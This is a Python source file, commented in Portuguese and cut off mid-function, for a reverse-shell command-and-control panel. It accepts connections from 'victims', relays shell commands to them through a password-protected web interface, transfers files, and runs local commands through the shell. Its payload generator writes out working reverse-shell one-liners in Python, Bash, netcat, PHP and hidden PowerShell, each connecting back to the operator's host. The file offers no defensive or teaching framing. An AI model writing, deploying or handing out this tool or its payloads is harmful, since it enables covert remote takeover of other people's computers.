#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import socket
import threading
import subprocess
import json
import base64
import time
import random
import hashlib
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import html
import cgi

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = ''
    class Style:
        BRIGHT = RESET_ALL = ''

# Configurações
ADMIN_PASSWORD = "erik2008"
SERVER_IP = "0.0.0.0"
SERVER_PORT = 8080
WEB_PORT = 8080  # Porta padrão alterada para não precisar de root
SHELL_PORT = 4444

class Victim:
    def __init__(self, conn, addr, victim_id):
        self.conn = conn
        self.addr = addr
        self.id = victim_id
        self.connected_time = time.time()
        self.last_activity = time.time()
        self.os_info = "Unknown"
        self.username = "Unknown"
        self.current_dir = "/"
        
    def update_activity(self):
        self.last_activity = time.time()
        
    def get_info(self):
        uptime = time.time() - self.connected_time
        hours, remainder = divmod(uptime, 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
        
        return {
            'id': self.id,
            'ip': self.addr[0],
            'port': self.addr[1],
            'os': self.os_info,
            'username': self.username,
            'uptime': uptime_str,
            'current_dir': self.current_dir
        }

class ReverseShellServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.victims = {}
        self.running = False
        self.server_socket = None
        
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"{Fore.GREEN}[+] Servidor shell reverso ouvindo em {self.host}:{self.port}{Style.RESET_ALL}")
            
            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    victim_id = str(uuid.uuid4())[:8]
                    victim = Victim(conn, addr, victim_id)
                    
                    # Obter informações básicas da vítima
                    try:
                        conn.send(b"whoami && uname -a && pwd\n")
                        time.sleep(0.5)
                        data = conn.recv(4096).decode().strip().split('\n')
                        if len(data) >= 3:
                            victim.username = data[0].strip()
                            victim.os_info = data[1].strip()
                            victim.current_dir = data[2].strip()
                    except:
                        pass
                    
                    self.victims[victim_id] = victim
                    print(f"{Fore.GREEN}[+] Nova vítima conectada: {addr[0]}:{addr[1]} (ID: {victim_id}){Style.RESET_ALL}")
                    
                except Exception as e:
                    if self.running:
                        print(f"{Fore.RED}[-] Erro ao aceitar conexão: {e}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Erro ao iniciar servidor shell reverso: {e}{Style.RESET_ALL}")
            
    def stop(self):
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        for victim_id, victim in self.victims.items():
            try:
                victim.conn.close()
            except:
                pass
        self.victims = {}
        
    def send_command(self, victim_id, command):
        if victim_id in self.victims:
            victim = self.victims[victim_id]
            try:
                victim.conn.send((command + "\n").encode())
                victim.update_activity()
                return True
            except Exception as e:
                print(f"{Fore.RED}[-] Erro ao enviar comando: {e}{Style.RESET_ALL}")
                return False
        return False
        
    def receive_output(self, victim_id, timeout=5):
        if victim_id in self.victims:
            victim = self.victims[victim_id]
            try:
                victim.conn.settimeout(timeout)
                output = victim.conn.recv(4096).decode()
                victim.update_activity()
                return output
            except socket.timeout:
                return "[Timeout] Nenhuma saída recebida"
            except Exception as e:
                return f"[Erro] {str(e)}"
        return "Vítima não encontrada"

class WebTerminalHandler(BaseHTTPRequestHandler):
    sessions = {}
    current_dir = os.getcwd()
    shell_server = None
    
    def do_GET(self):
        try:
            path = urlparse(self.path).path
            
            # Verificar sessão
            session_id = self.get_session_id()
            if path != '/login' and not self.is_authenticated(session_id):
                self.redirect_login()
                return
            
            if path == '/':
                self.serve_main_page(session_id)
            elif path == '/login':
                self.serve_login_page()
            elif path == '/logout':
                self.logout(session_id)
            elif path == '/api/command':
                self.handle_command_api()
            elif path == '/api/files':
                self.handle_files_api()
            elif path == '/api/download':
                self.handle_download_api()
            elif path == '/api/upload':
                self.handle_upload_api()
            elif path == '/api/victims':
                self.handle_victims_api()
            elif path == '/api/shell_command':
                self.handle_shell_command_api()
            elif path == '/api/generate_shell':
                self.handle_generate_shell_api()
            elif path.startswith('/static/'):
                self.serve_static_file(path)
            else:
                self.send_error(404)
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        try:
            path = urlparse(self.path).path
            
            if path == '/login':
                self.handle_login()
            elif path == '/api/command':
                self.handle_command_api()
            elif path == '/api/upload':
                self.handle_upload_api()
            elif path == '/api/shell_command':
                self.handle_shell_command_api()
            else:
                self.send_error(404)
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def get_session_id(self):
        cookies = self.headers.get('Cookie', '')
        for cookie in cookies.split(';'):
            if 'session_id' in cookie:
                return cookie.split('=')[1].strip()
        return None
    
    def is_authenticated(self, session_id):
        return session_id in self.sessions and self.sessions[session_id]['authenticated']
    
    def create_session(self):
        session_id = hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]
        self.sessions[session_id] = {
            'authenticated': True,
            'created': time.time()
        }
        return session_id
    
    def logout(self, session_id):
        if session_id in self.sessions:
            del self.sessions[session_id]
        self.redirect_login()
    
    def redirect_login(self):
        self.send_response(302)
        self.send_header('Location', '/login')
        self.end_headers()
    
    def handle_login(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode()
        params = parse_qs(post_data)
        
        password = params.get('password', [''])[0]
        
        if password == ADMIN_PASSWORD:
            session_id = self.create_session()
            self.send_response(302)
            self.send_header('Location', '/')
            self.send_header('Set-Cookie', f'session_id={session_id}; Path=/; HttpOnly')
            self.end_headers()
        else:
            self.serve_login_page(error="Senha incorreta!")
    
    def serve_login_page(self, error=None):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html_content = f'''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Login - Shell Reverso</title>
            <style>
                body {{
                    background: #0d1117;
                    color: #c9d1d9;
                    font-family: 'Courier New', monospace;
                    margin: 0;
                    padding: 20px;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }}
                .login-container {{
                    background: #161b22;
                    padding: 40px;
                    border-radius: 10px;
                    border: 1px solid #30363d;
                    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                    width: 300px;
                }}
                h1 {{
                    color: #58a6ff;
                    text-align: center;
                    margin-bottom: 30px;
                }}
                input[type="password"] {{
                    width: 100%;
                    padding: 12px;
                    margin: 10px 0;
                    background: #0d1117;
                    border: 1px solid #30363d;
                    color: #c9d1d9;
                    border-radius: 5px;
                    outline: none;
                }}
                input[type="password"]:focus {{
                    border-color: #58a6ff;
                }}
                button {{
                    width: 100%;
                    padding: 12px;
                    background: #238636;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                }}
                button:hover {{
                    background: #2ea043;
                }}
                .error {{
                    color: #f85149;
                    text-align: center;
                    margin-top: 10px;
                }}
            </style>
        </head>
        <body>
            <div class="login-container">
                <h1>🔐 Acesso Restrito</h1>
                <form method="POST">
                    <input type="password" name="password" placeholder="Senha de administrador" required>
                    <button type="submit">Acessar</button>
                </form>
                {f'<div class="error">{error}</div>' if error else ''}
            </div>
        </body>
        </html>
        '''
        self.wfile.write(html_content.encode('utf-8'))
    
    def serve_main_page(self, session_id):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        
        html_content = '''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Terminal Web - Shell Reverso</title>
            <style>
                :root {
                    --bg-primary: #0d1117;
                    --bg-secondary: #161b22;
                    --border: #30363d;
                    --text-primary: #c9d1d9;
                    --text-secondary: #8b949e;
                    --accent: #58a6ff;
                    --success: #3fb950;
                    --error: #f85149;
                    --warning: #d29922;
                }
                
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                }
                
                body {
                    background: var(--bg-primary);
                    color: var(--text-primary);
                    font-family: 'Fira Code', 'Courier New', monospace;
                    line-height: 1.6;
                    overflow: hidden;
                }
                
                .container {
                    display: grid;
                    grid-template-columns: 250px 1fr;
                    grid-template-rows: 60px 1fr 200px;
                    grid-template-areas: 
                        "header header"
                        "sidebar terminal"
                        "sidebar input";
                    height: 100vh;
                }
                
                .header {
                    grid-area: header;
                    background: var(--bg-secondary);
                    border-bottom: 1px solid var(--border);
                    padding: 0 20px;
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                }
                
                .sidebar {
                    grid-area: sidebar;
                    background: var(--bg-secondary);
                    border-right: 1px solid var(--border);
                    padding: 20px;
                    overflow-y: auto;
                }
                
                .terminal {
                    grid-area: terminal;
                    background: var(--bg-primary);
                    padding: 20px;
                    overflow-y: auto;
                    font-family: 'Fira Code', monospace;
                }
                
                .input-area {
                    grid-area: input;
                    background: var(--bg-secondary);
                    border-top: 1px solid var(--border);
                    padding: 15px;
                    display: flex;
                    gap: 10px;
                }
                
                .command-input {
                    flex: 1;
                    padding: 12px;
                    background: var(--bg-primary);
                    border: 1px solid var(--border);
                    color: var(--text-primary);
                    border-radius: 5px;
                    font-family: 'Fira Code', monospace;
                    outline: none;
                }
                
                .command-input:focus {
                    border-color: var(--accent);
                }
                
                .send-btn {
                    padding: 12px 20px;
                    background: var(--accent);
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    font-weight: bold;
                }
                
                .send-btn:hover {
                    opacity: 0.9;
                }
                
                .file-list {
                    list-style: none;
                }
                
                .file-item {
                    padding: 8px;
                    margin: 5px 0;
                    background: var(--bg-primary);
                    border-radius: 5px;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .file-item:hover {
                    background: #1c2128;
                }
                
                .file-icon {
                    width: 16px;
                    height: 16px;
                }
                
                .terminal-line {
                    margin-bottom: 5px;
                    white-space: pre-wrap;
                    word-break: break-all;
                }
                
                .command {
                    color: var(--accent);
                    font-weight: bold;
                }
                
                .output {
                    color: var(--text-primary);
                }
                
                .error {
                    color: var(--error);
                }
                
                .success {
                    color: var(--success);
                }
                
                .warning {
                    color: var(--warning);
                }
                
                .btn {
                    padding: 8px 16px;
                    background: var(--accent);
                    color: white;
                    border: none;
                    border-radius: 5px;
                    cursor: pointer;
                    margin: 5px 0;
                    width: 100%;
                    text-align: center;
                    font-size: 12px;
                }
                
                .btn:hover {
                    opacity: 0.9;
                }
                
                .btn-danger {
                    background: var(--error);
                }
                
                .btn-success {
                    background: var(--success);
                }
                
                .btn-warning {
                    background: var(--warning);
                }
                
                .section {
                    margin-bottom: 20px;
                }
                
                .section-title {
                    color: var(--accent);
                    margin-bottom: 10px;
                    font-weight: bold;
                    font-size: 14px;
                    display: flex;
                    align-items: center;
                    gap: 5px;
                }
                
                .victim-list {
                    margin-top: 10px;
                }
                
                .victim-item {
                    padding: 10px;
                    background: var(--bg-primary);
                    border-radius: 5px;
                    margin-bottom: 10px;
                    cursor: pointer;
                    border-left: 3px solid var(--accent);
                }
                
                .victim-item.active {
                    border-left-color: var(--success);
                }
                
                .victim-item:hover {
                    background: #1c2128;
                }
                
                .victim-info {
                    font-size: 12px;
                    color: var(--text-secondary);
                }
                
                .tab-container {
                    display: flex;
                    gap: 5px;
                    margin-bottom: 10px;
                }
                
                .tab {
                    padding: 8px 15px;
                    background: var(--bg-primary);
                    border-radius: 5px 5px 0 0;
                    cursor: pointer;
                    font-size: 12px;
                }
                
                .tab.active {
                    background: var(--accent);
                    color: white;
                }
                
                .tab-content {
                    display: none;
                }
                
                .tab-content.active {
                    display: block;
                }
                
                .code-block {
                    background: var(--bg-primary);
                    padding: 15px;
                    border-radius: 5px;
                    overflow-x: auto;
                    font-size: 12px;
                    margin: 10px 0;
                }
                
                .copy-btn {
                    padding: 5px 10px;
                    background: var(--accent);
                    color: white;
                    border: none;
                    border-radius: 3px;
                    cursor: pointer;
                    font-size: 11px;
                    margin-top: 5px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🖥️ Terminal Web - Shell Reverso</h1>
                    <div>
                        <span id="current-dir"></span>
                        <a href="/logout" class="btn">Sair</a>
                    </div>
                </div>
                
                <div class="sidebar">
                    <div class="tab-container">
                        <div class="tab active" onclick="switchTab('victims-tab')">👥 Vítimas</div>
                        <div class="tab" onclick="switchTab('files-tab')">📁 Arquivos</div>
                        <div class="tab" onclick="switchTab('tools-tab')">🛠️ Ferramentas</div>
                    </div>
                    
                    <div id="victims-tab" class="tab-content active">
                        <div class="section">
                            <div class="section-title">🔗 Vítimas Conectadas</div>
                            <div id="victims-list" class="victim-list">
                                <div class="victim-item" onclick="selectVictim('local')">
                                    <strong>Terminal Local</strong>
                                    <div class="victim-info">Sistema local</div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="section">
                            <div class="section-title">⚡ Comandos Rápidos</div>
                            <button class="btn" onclick="executeCommand('pwd')">pwd</button>
                            <button class="btn" onclick="executeCommand('ls -la')">ls -la</button>
                            <button class="btn" onclick="executeCommand('whoami')">whoami</button>
                            <button class="btn" onclick="executeCommand('uname -a')">uname -a</button>
                        </div>
                    </div>
                    
                    <div id="files-tab" class="tab-content">
                        <div class="section">
                            <div class="section-title">📁 Sistema de Arquivos</div>
                            <div id="file-explorer"></div>
                        </div>
                        
                        <div class="section">
                            <div class="section-title">📤 Upload/Download</div>
                            <input type="file" id="file-upload" style="display: none;">
                            <button class="btn" onclick="document.getElementById('file-upload').click()">Upload File</button>
                        </div>
                    </div>
                    
                    <div id="tools-tab" class="tab-content">
                        <div class="section">
                            <div class="section-title">🐚 Gerar Shell</div>
                            <select id="shell-type" class="command-input" style="margin-bottom: 10px;">
                                <option value="python">Python</option>
                                <option value="bash">Bash</option>
                                <option value="nc">Netcat</option>
                                <option value="php">PHP</option>
                                <option value="powershell">PowerShell</option>
                            </select>
                            <button class="btn" onclick="generateShell()">Gerar Payload</button>
                            <div id="shell-output" class="code-block" style="display: none;">
                                <div id="shell-code"></div>
                                <button class="copy-btn" onclick="copyShellCode()">Copiar</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="terminal" id="terminal-output">
                    <div class="terminal-line success">✅ Conectado ao terminal local</div>
                    <div class="terminal-line">Digite "help" para ver comandos disponíveis</div>
                </div>
                
                <div class="input-area">
                    <input type="text" class="command-input" id="command-input" 
                           placeholder="Digite seu comando..." onkeypress="handleKeyPress(event)">
                    <button class="send-btn" onclick="executeCommand(document.getElementById('command-input').value)">Enviar</button>
                </div>
            </div>

            <script>
                let currentDirectory = '/';
                let selectedVictim = 'local';
                let victims = {};
                
                function switchTab(tabId) {
                    // Esconder todas as abas
                    document.querySelectorAll('.tab-content').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    
                    // Mostrar a aba selecionada
                    document.getElementById(tabId).classList.add('active');
                    
                    // Atualizar tabs
                    document.querySelectorAll('.tab').forEach(tab => {
                        tab.classList.remove('active');
                    });
                    event.currentTarget.classList.add('active');
                }
                
                function selectVictim(victimId) {
                    selectedVictim = victimId;
                    
                    // Atualizar UI
                    document.querySelectorAll('.victim-item').forEach(item => {
                        item.classList.remove('active');
                    });
                    event.currentTarget.classList.add('active');
                    
                    // Limpar terminal
                    document.getElementById('terminal-output').innerHTML = '';
                    
                    // Adicionar mensagem de conexão
                    if (victimId === 'local') {
                        addTerminalLine('✅ Conectado ao terminal local', 'success');
                    } else {
                        const victim = victims[victimId];
                        addTerminalLine(`✅ Conectado à vítima ${victim.ip} (${victim.username})`, 'success');
                    }
                }
                
                function executeCommand(command) {
                    if (!command.trim()) return;
                    
                    // Adicionar comando ao terminal
                    addTerminalLine('$ ' + command, 'command');
                    
                    // Determinar para onde enviar o comando
                    const isLocal = selectedVictim === 'local';
                    const apiUrl = isLocal ? '/api/command' : '/api/shell_command';
                    const payload = isLocal ? 
                        { command: command } : 
                        { victim_id: selectedVictim, command: command };
                    
                    // Enviar comando para o servidor
                    fetch(apiUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            addTerminalLine(data.output, 'output');
                            if (data.current_dir) {
                                currentDirectory = data.current_dir;
                                document.getElementById('current-dir').textContent = currentDirectory;
                            }
                            if (isLocal) {
                                updateFileExplorer();
                            }
                        } else {
                            addTerminalLine('Erro: ' + data.error, 'error');
                        }
                    })
                    .catch(error => {
                        addTerminalLine('Erro de conexão: ' + error, 'error');
                    });
                    
                    // Limpar input
                    document.getElementById('command-input').value = '';
                }
                
                function handleKeyPress(event) {
                    if (event.key === 'Enter') {
                        executeCommand(document.getElementById('command-input').value);
                    }
                }
                
                function addTerminalLine(text, type) {
                    const terminal = document.getElementById('terminal-output');
                    const line = document.createElement('div');
                    line.className = 'terminal-line ' + type;
                    line.textContent = text;
                    terminal.appendChild(line);
                    terminal.scrollTop = terminal.scrollHeight;
                }
                
                function updateFileExplorer() {
                    fetch('/api/files?path=' + encodeURIComponent(currentDirectory))
                        .then(response => response.json())
                        .then(data => {
                            const explorer = document.getElementById('file-explorer');
                            explorer.innerHTML = '';
                            
                            data.files.forEach(file => {
                                const item = document.createElement('div');
                                item.className = 'file-item';
                                item.innerHTML = `
                                    <span class="file-icon">${file.is_dir ? '📁' : '📄'}</span>
                                    <span>${file.name}</span>
                                `;
                                item.onclick = () => {
                                    if (file.is_dir) {
                                        executeCommand('cd "' + file.name + '" && pwd');
                                    }
                                };
                                explorer.appendChild(item);
                            });
                        });
                }
                
                function updateVictimsList() {
                    fetch('/api/victims')
                        .then(response => response.json())
                        .then(data => {
                            victims = data.victims;
                            const victimsList = document.getElementById('victims-list');
                            
                            // Manter o item local
                            const localItem = victimsList.querySelector('[onclick="selectVictim(\'local\')"]');
                            victimsList.innerHTML = '';
                            victimsList.appendChild(localItem);
                            
                            // Adicionar vítimas
                            for (const [id, victim] of Object.entries(victims)) {
                                const item = document.createElement('div');
                                item.className = 'victim-item';
                                if (id === selectedVictim) {
                                    item.classList.add('active');
                                }
                                item.innerHTML = `
                                    <strong>${victim.username}@${victim.ip}</strong>
                                    <div class="victim-info">${victim.os} | ${victim.uptime}</div>
                                    <div class="victim-info">${victim.current_dir}</div>
                                `;
                                item.onclick = () => selectVictim(id);
                                victimsList.appendChild(item);
                            }
                        });
                }
                
                function generateShell() {
                    const shellType = document.getElementById('shell-type').value;
                    
                    fetch('/api/generate_shell?type=' + shellType)
                        .then(response => response.json())
                        .then(data => {
                            if (data.success) {
                                const shellOutput = document.getElementById('shell-output');
                                const shellCode = document.getElementById('shell-code');
                                
                                shellCode.textContent = data.shell_code;
                                shellOutput.style.display = 'block';
                            } else {
                                alert('Erro: ' + data.error);
                            }
                        });
                }
                
                function copyShellCode() {
                    const shellCode = document.getElementById('shell-code');
                    const textArea = document.createElement('textarea');
                    textArea.value = shellCode.textContent;
                    document.body.appendChild(textArea);
                    textArea.select();
                    document.execCommand('copy');
                    document.body.removeChild(textArea);
                    alert('Código copiado para a área de transferência!');
                }
                
                // Inicializar
                document.addEventListener('DOMContentLoaded', function() {
                    updateFileExplorer();
                    executeCommand('pwd');
                    document.getElementById('command-input').focus();
                    
                    // Atualizar lista de vítimas a cada 5 segundos
                    setInterval(updateVictimsList, 5000);
                    
                    // Configurar upload
                    document.getElementById('file-upload').addEventListener('change', function(e) {
                        const file = e.target.files[0];
                        if (file) {
                            const formData = new FormData();
                            formData.append('file', file);
                            
                            fetch('/api/upload', {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.success) {
                                    addTerminalLine('✅ Arquivo enviado: ' + data.filename, 'success');
                                    updateFileExplorer();
                                } else {
                                    addTerminalLine('❌ Erro no upload: ' + data.error, 'error');
                                }
                            });
                        }
                    });
                });
            </script>
        </body>
        </html>
        '''
        self.wfile.write(html_content.encode('utf-8'))
    
    def handle_command_api(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        command = data.get('command', '')
        result = self.execute_command(command)
        
        response = {
            'success': True,
            'output': result,
            'current_dir': self.current_dir
        }
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_shell_command_api(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        victim_id = data.get('victim_id', '')
        command = data.get('command', '')
        
        if self.shell_server and victim_id in self.shell_server.victims:
            # Enviar comando para a vítima
            if self.shell_server.send_command(victim_id, command):
                # Aguardar um pouco para a vítima processar o comando
                time.sleep(1)
                # Receber a saída
                output = self.shell_server.receive_output(victim_id)
                
                # Atualizar diretório atual se for um comando cd
                if command.startswith('cd '):
                    self.shell_server.send_command(victim_id, 'pwd')
                    time.sleep(0.5)
                    new_dir = self.shell_server.receive_output(victim_id).strip()
                    if new_dir and not new_dir.startswith('['):
                        self.shell_server.victims[victim_id].current_dir = new_dir
                
                response = {
                    'success': True,
                    'output': output,
                    'current_dir': self.shell_server.victims[victim_id].current_dir
                }
            else:
                response = {'success': False, 'error': 'Falha ao enviar comando'}
        else:
            response = {'success': False, 'error': 'Vítima não encontrada'}
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_victims_api(self):
        victims_info = {}
        if self.shell_server:
            for victim_id, victim in self.shell_server.victims.items():
                victims_info[victim_id] = victim.get_info()
        
        response = {'success': True, 'victims': victims_info}
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_files_api(self):
        query = urlparse(self.path).query
        params = parse_qs(query)
        path = params.get('path', [self.current_dir])[0]
        
        try:
            files = []
            if os.path.exists(path):
                for item in os.listdir(path):
                    item_path = os.path.join(path, item)
                    files.append({
                        'name': item,
                        'is_dir': os.path.isdir(item_path),
                        'size': os.path.getsize(item_path) if not os.path.isdir(item_path) else 0
                    })
            
            response = {'success': True, 'files': files}
            
        except Exception as e:
            response = {'success': False, 'error': str(e)}
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_download_api(self):
        query = urlparse(self.path).query
        params = parse_qs(query)
        file_path = params.get('file', [''])[0]
        
        if os.path.exists(file_path) and os.path.isfile(file_path):
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
            self.end_headers()
            
            with open(file_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "File not found")
    
    def handle_upload_api(self):
        try:
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={'REQUEST_METHOD': 'POST'}
            )
            
            file_item = form['file']
            if file_item.file:
                filename = os.path.join(self.current_dir, file_item.filename)
                with open(filename, 'wb') as f:
                    f.write(file_item.file.read())
                
                response = {'success': True, 'filename': filename}
            else:
                response = {'success': False, 'error': 'No file uploaded'}
                
        except Exception as e:
            response = {'success': False, 'error': str(e)}
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def handle_generate_shell_api(self):
        query = urlparse(self.path).query
        params = parse_qs(query)
        shell_type = params.get('type', ['python'])[0]
        
        try:
            # Obter o IP real do servidor (não 0.0.0.0)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            server_ip = s.getsockname()[0]
            s.close()
            
            shell_code = ""
            if shell_type == "python":
                shell_code = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'''
            elif shell_type == "bash":
                shell_code = f'bash -i >& /dev/tcp/{server_ip}/{SHELL_PORT} 0>&1'
            elif shell_type == "nc":
                shell_code = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {server_ip} {SHELL_PORT} >/tmp/f'
            elif shell_type == "php":
                shell_code = f'php -r \'$sock=fsockopen("{server_ip}",{SHELL_PORT});exec("/bin/sh -i <&3 >&3 2>&3");\''
            elif shell_type == "powershell":
                shell_code = f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{server_ip}",{SHELL_PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
            else:
                raise ValueError("Tipo de shell não suportado")
            
            response = {'success': True, 'shell_code': shell_code}
            
        except Exception as e:
            response = {'success': False, 'error': str(e)}
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())
    
    def execute_command(self, command):
        try:
            if command.startswith('cd '):
                new_dir = command[3:].strip()
                if new_dir:
                    os.chdir(new_dir)
                    self.current_dir = os.getcwd()
                return f"Diretório alterado para: {self.current_dir}"
            
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                cwd=self.current_dir
            )
            
            stdout, stderr = process.communicate()
            result = stdout.decode('utf-8', errors='ignore') + stderr.decode('utf-8', errors='ignore')
            return result.strip() or "Comando executado (sem output)"
            
        except Exception as e:
            return f"Erro: {str(e)}"
    
    def serve_static_file(self, path):
        self.send_error(404)

class TerminalPanel:
    def __init__(self):
        self.server = None
        self.shell_server = None
        self.web_thread = None
        self.shell_thread = None
        self.running = False
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║{Fore.MAGENTA}                   🎯 SHELL REVERSO - TERMINAL WEB{Fore.CYAN}                           ║
║                                                                              ║ 
║{Fore.YELLOW}    Web Interface: {SERVER_IP:<15} Porta: {WEB_PORT:<10}{Fore.CYAN}                         ║
║{Fore.YELLOW}    Shell Server:  {SERVER_IP:<15} Porta: {SHELL_PORT:<10}{Fore.CYAN}                         ║
║{Fore.YELLOW}    Senha Admin:   {ADMIN_PASSWORD:<10}{Fore.CYAN}                                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def start_web_server(self):
        try:
            # Configurar o servidor shell reverso no handler
            WebTerminalHandler.shell_server = self.shell_server
            
            self.server = HTTPServer((SERVER_IP, WEB_PORT), WebTerminalHandler)
            print(f"{Fore.GREEN}✅ Servidor web iniciado em http://{SERVER_IP}:{WEB_PORT}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}📋 Use a senha: {ADMIN_PASSWORD} para acessar o painel{Style.RESET_ALL}")
            self.running = True
            self.server.serve_forever()
        except Exception as e:
            print(f"{Fore.RED}❌ Erro ao iniciar servidor web: {e}{Style.RESET_ALL}")
    
    def start_shell_server(self):
        try:
            self.shell_server = ReverseShellServer(SERVER_IP, SHELL_PORT)
            self.shell_server.start()
        except Exception as e:
            print(f"{Fore.RED}❌ Erro ao iniciar servidor shell: {e}{Style.RESET_ALL}")
    
    def show_menu(self):
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
            print(f"║{Fore.WHITE}                       MENU PRINCIPAL{Fore.CYAN}                         ║")
            print(f"╠══════════════════════════════════════════════════════════════╣")
            print(f"║{Fore.GREEN} 1.{Fore.WHITE} Iniciar Servidores (Web + Shell){Fore.CYAN}                       ║")
            print(f"║{Fore.GREEN} 2.{Fore.WHITE} Configurar IP/Porta{Fore.CYAN}                                       ║")
            print(f"║{Fore.GREEN} 3.{Fore.WHITE} Gerar Script de Shell Reverso{Fore.CYAN}                            ║")
            print(f"║{Fore.GREEN} 4.{Fore.WHITE} Ver Vítimas Conectadas{Fore.CYAN}                                   ║")
            print(f"║{Fore.GREEN} 5.{Fore.WHITE} Testar Conexão{Fore.CYAN}                                            ║")
            print(f"║{Fore.GREEN} 6.{Fore.WHITE} Sair{Fore.CYAN}                                                      ║")
            print(f"╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
            
            choice = input(f"\n{Fore.YELLOW}➤ Selecione uma opção: {Style.RESET_ALL}").strip()
            
            if choice == '1':
                self.start_servers()
            elif choice == '2':
                self.configure_settings()
            elif choice == '3':
                self.generate_shell_script()
            elif choice == '4':
                self.show_victims()
            elif choice == '5':
                self.test_connection()
            elif choice == '6':
                self.clean_exit()
                break
            else:
                print(f"{Fore.RED}❌ Opção inválida!{Style.RESET_ALL}")
                time.sleep(1)
    
    def start_servers(self):
        if self.web_thread and self.web_thread.is_alive():
